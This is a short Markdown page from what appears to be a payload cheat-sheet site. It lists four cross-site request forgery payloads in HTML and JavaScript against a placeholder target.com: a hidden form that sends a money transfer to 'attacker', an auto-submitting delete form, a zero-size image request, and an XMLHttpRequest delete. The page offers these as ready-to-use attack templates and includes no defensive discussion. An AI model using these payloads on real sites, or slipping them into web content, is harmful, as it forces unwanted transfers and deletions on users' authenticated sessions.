---
layout: default
title: CSRF Payloads
---

# 🔄 Cross-Site Request Forgery (CSRF) Payloads

## HTML Form CSRF
```html
<form action="http://target.com/transfer" method="POST">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="to" value="attacker">
  <input type="submit" value="Click me">
</form>
```

## Auto-submit CSRF
```html
<form id="csrf" action="http://target.com/delete" method="POST">
  <input type="hidden" name="id" value="123">
</form>
<script>document.getElementById('csrf').submit();</script>
```

## Image-based CSRF (GET)
```html
<img src="http://target.com/delete?id=123" width="0" height="0">
```

## AJAX CSRF
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://target.com/api/delete');
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.send('{"id":"123"}');
</script>
```